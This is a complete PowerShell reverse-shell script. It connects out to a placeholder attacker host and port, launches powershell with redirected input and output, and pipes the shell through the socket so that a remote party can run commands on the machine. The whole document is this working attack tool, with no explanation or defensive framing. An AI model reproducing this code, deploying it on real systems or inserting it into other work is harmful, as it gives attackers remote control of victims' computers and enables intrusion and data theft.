$TargetHost = "x.x.x.x";
$TargetPort = yyyy;
$CommandExec = "powershell"
$CommandArgs = ""
$ErrorActionPreference = "Stop";
try{
$Client = New-Object System.Net.Sockets.TcpClient;
$Client.Connect($TargetHost, $TargetPort);
$Stream = $Client.GetStream();
Write-Output "Connected!"
$Process = New-Object System.Diagnostics.Process;
$Process.StartInfo.FileName = $CommandExec
$Process.StartInfo.Arguments = $CommandArgs
$Process.StartInfo.RedirectStandardOutput = $true;
$Process.StartInfo.RedirectStandardInput = $true;
$Process.StartInfo.UseShellExecute = $false;
$Process.Start() | Out-Null;
$CharBuf = New-Object Char[] 65536;
$ByteBuf = New-Object Byte[] 65536;
Function ReadStream{ $Stream.ReadAsync($ByteBuf, 0 ,65530) }
Function ReadStdout{ $Process.StandardOutput.ReadAsync($CharBuf, 0, 65535) }
$T1 = ReadStream
$T2 = ReadStdout
while($true){
$T = [System.Threading.Tasks.Task]::WaitAny($T1, $T2)
if($T -eq 0){
if(($N = $T1.Result) -eq 0){ throw "Socket EOF."; }
while($ByteBuf[$($N-1)] -band 0x80){
if($Stream.Read($ByteBuf, $N++, 1) -eq 0){
throw "Socket EOF."
}
}
$String = [System.Text.Encoding]::UTF8.GetString($ByteBuf[0..$($N-1)])
$Process.StandardInput.Write($String);
$T1 = ReadStream
}else{
if(($N = $T2.Result) -eq 0){ throw "Process EOF."; }
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($CharBuf, 0, $N)
$Stream.Write($Bytes, 0, $Bytes.Count);
$T2 = ReadStdout
}
}
}catch{
Write-Output $_.ToString()
}finally{
Write-Output "Shutting down."
try{ $Client.Close() }catch{ }
try{ $Process.Kill() }catch{ }
}
